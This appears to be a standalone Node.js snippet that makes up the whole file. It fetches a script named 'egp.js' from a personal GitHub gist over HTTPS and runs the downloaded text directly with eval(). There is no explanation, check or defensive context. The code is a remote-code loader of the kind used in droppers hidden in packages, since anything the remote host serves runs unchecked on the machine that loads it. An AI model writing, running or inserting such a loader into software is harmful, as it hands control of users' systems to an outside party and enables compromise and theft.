const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/680dd0ab132882bd3c1d315bfe44991d9ac63705/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
